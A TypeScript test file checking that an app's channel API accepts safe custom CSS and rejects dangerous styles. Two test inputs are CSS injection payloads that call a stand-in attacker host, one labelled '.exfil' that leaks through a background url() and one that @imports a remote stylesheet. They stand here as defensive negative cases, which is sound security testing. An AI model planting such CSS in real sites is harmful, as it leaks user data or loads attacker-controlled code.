import test, { beforeEach } from "node:test";
import assert from "node:assert/strict";
import { buildApp } from "../app.js";
import { config } from "../config.js";
import { initDb, pool } from "../db/client.js";
import { upsertIdentityMapping } from "../services/identity-service.js";
import { resetDb } from "./helpers/reset-db.js";
import { createAuthCookie } from "./helpers/auth.js";
import { bootstrap as bootstrapHub } from "./helpers/bootstrap.js";

beforeEach(async () => {
  if (pool) {
    await initDb();
    await resetDb();
  }
});

const bootstrap = (app: Awaited<ReturnType<typeof buildApp>>) =>
  bootstrapHub(app, { prefix: "chan", hubName: "Channel CRUD Hub" });

test("channel management with styleContent and CSS safety", async (t) => {
  if (!pool) { t.skip("DATABASE_URL not configured."); return; }
  if (!config.setupBootstrapToken) { t.skip("SETUP_BOOTSTRAP_TOKEN not configured."); return; }

  const app = await buildApp();

  try {
    const { adminCookie, defaultServerId } = await bootstrap(app);

    // 1. Create channel with styleContent
    const createRes = await app.inject({
      method: "POST",
      url: "/v1/channels",
      headers: { cookie: adminCookie },
      payload: {
        serverId: defaultServerId,
        name: "styled-landing",
        type: "landing",
        styleContent: ".hero { color: cyan; }"
      }
    });
    assert.equal(createRes.statusCode, 201);
    const channel = createRes.json();
    assert.equal(channel.styleContent, ".hero { color: cyan; }");

    // 2. Update channel with data: URI (allowed)
    const updateRes = await app.inject({
      method: "PATCH",
      url: `/v1/channels/${channel.id}`,
      headers: { cookie: adminCookie },
      payload: {
        serverId: defaultServerId,
        styleContent: ".icon { background: url('data:image/png;base64,AAA'); }"
      }
    });
    assert.equal(updateRes.statusCode, 200);
    assert.ok(updateRes.json().styleContent.includes("data:image/png"));

    // 3. Attempt update with external url() (forbidden)
    const dangerousRes = await app.inject({
      method: "PATCH",
      url: `/v1/channels/${channel.id}`,
      headers: { cookie: adminCookie },
      payload: {
        serverId: defaultServerId,
        styleContent: ".exfil { background: url('https://attacker.com/leak'); }"
      }
    });
    // Expected to fail due to validateChannelStyle throwing
    assert.notEqual(dangerousRes.statusCode, 200);

    // 4. Attempt update with @import (forbidden)
    const importRes = await app.inject({
      method: "PATCH",
      url: `/v1/channels/${channel.id}`,
      headers: { cookie: adminCookie },
      payload: {
        serverId: defaultServerId,
        styleContent: "@import url('https://attacker.com/malicious.css');"
      }
    });
    assert.notEqual(importRes.statusCode, 200);

  } finally {
    await app.close();
  }
});
